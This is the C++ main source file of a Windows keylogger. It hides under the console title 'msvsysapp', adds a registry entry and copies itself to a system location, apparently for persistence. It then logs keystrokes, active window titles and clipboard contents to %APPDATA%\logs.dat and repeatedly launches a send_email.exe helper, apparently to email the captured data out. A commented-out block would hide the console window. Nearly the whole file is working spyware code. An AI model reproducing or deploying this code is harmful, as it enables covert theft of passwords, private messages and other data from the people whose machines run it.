//KeyLogger.cpp 
#include <iostream>
#include "KeyLogger.h"
#include <fstream>
#include <Windows.h>
#include "CClip.h"
#include <ctime>
#include <string>

const std::string LogPath = getenv("APPDATA") + std::string("\\logs.dat"); 
const std::string pymail = getenv("APPDATA") + std::string("\\send_email.exe");
LPCSTR path = pymail.c_str();	//convert string to LPCSTR

int main(int argc, char * argv[])
{
	//HWND stealth; // window handler used to hide the outputted console window
	//AllocConsole();
	//stealth = FindWindowA("ConsoleWindowClass", NULL);
	//ShowWindow(stealth, 0);
	std::fstream logFile, clipFile;
	KeyLogger k;
	CClip cp;
	time_t sysbasetime = time(0);
	char * date = ctime(&sysbasetime);
	std::string handle = k.GetWindowTitle();
	STARTUPINFO si; 		//Startup info for CreateProcess()
	PROCESS_INFORMATION pi;	//Process info for CreateProcess()	
	CreateMutex(NULL, TRUE, "8154d1e24f699f5b217f5ebc8c8c823c");
	if (GetLastError() != ERROR_ALREADY_EXISTS) {
		SetConsoleTitle("msvsysapp");
		Sleep(500);
		k.AddREG();
		k.CopyToSys(argv[0]);
		std::cout << "[  i  ] Starting KeyLogger...	[  i  ]";
		logFile.open(LogPath.c_str() , fstream::app);
		logFile << "\n \n   " << date << '\n'
			<< "APP: " << handle << '\n';
		logFile.close();
		while (true) {
			if (handle != k.GetWindowTitle()) {
				logFile.open(LogPath.c_str(), fstream::app);
				logFile << "\n \nAPP: " << k.GetWindowTitle() << '\n';
				handle = k.GetWindowTitle();
				logFile.close();
			}
			k.OEMkeys(logFile);
			k.AZkeys(logFile);
			k.NUMkeys(logFile);
			k.SpecialKeys(logFile);
			cp.GetClipboard(clipFile);
			
			ZeroMemory( &si, sizeof(si) );
			si.cb = sizeof(si);
			ZeroMemory( &pi, sizeof(pi) );


			// Start the child process. create pass.txt with email & password to work  [email \n passsword]
			if( !CreateProcess( path,   // path to send_email.exe
				argv[1],        // Command line
				NULL,           // Process handle not inheritable
				NULL,           // Thread handle not inheritable
				FALSE,          // Set handle inheritance to FALSE
				0,              // No creation flags
				NULL,           // Use parent's environment block
				NULL,           // Use parent's starting directory 
				&si,            // Pointer to STARTUPINFO structure
				&pi )           // Pointer to PROCESS_INFORMATION structure
			) 
			{
				printf( "CreateProcess failed (%d).\n", GetLastError() );
			}

			// Wait until child process exits.
			WaitForSingleObject( pi.hProcess, INFINITE );

			// Close process and thread handles. 
			CloseHandle( pi.hProcess );
			CloseHandle( pi.hThread ); 
		}
	}
	system("pause");
	return 0;
}
